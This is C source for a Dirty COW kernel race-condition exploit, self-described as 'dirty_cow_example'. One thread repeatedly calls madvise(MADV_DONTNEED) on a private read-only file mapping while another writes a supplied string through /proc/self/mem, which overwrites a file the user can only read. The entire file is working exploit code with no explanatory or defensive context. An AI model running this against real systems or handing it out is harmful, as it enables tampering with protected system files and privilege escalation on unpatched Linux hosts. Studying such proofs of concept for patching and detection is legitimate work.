#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

void* target_fmap;
static struct stat target_fst;

void* mem_madvise4dontneed_th(void* data)
{
	while (1) {
		madvise(target_fmap, target_fst.st_size, MADV_DONTNEED);
	}
}
 
void* mem_write_th(void* data)
{
	int fd;

	fd = open("/proc/self/mem", O_RDWR);
	while (1) {
		lseek(fd, (off_t)target_fmap, SEEK_SET);
		write(fd, (char*)data, strnlen((char*)data, target_fst.st_size));
	}
}

int main(int argc,char *argv[])
{
	int target_fd;
	pthread_t th4write, th4dontneed;

	if (argc != 3) {
		printf("useage error! [dirty_cow_example $file_path $string]\n");

		return -1;
	}

	target_fd = open(argv[1], O_RDONLY);
	if (target_fd < 0) {
		printf("open [%s] failed\n", argv[1]);
	}
	fstat(target_fd, &target_fst);

	target_fmap = mmap(NULL, target_fst.st_size ,PROT_READ, MAP_PRIVATE, target_fd, 0);
	if (((signed long)target_fmap) <= 0) {
		printf("mmap [%s] by file id failed\n", argv[1]);
	}

	pthread_create(&th4write, NULL, mem_write_th, argv[2]);
	pthread_create(&th4dontneed, NULL, mem_madvise4dontneed_th, argv[1]);
    pthread_join(th4write, NULL);
	pthread_join(th4dontneed, NULL);

	return 0;
}
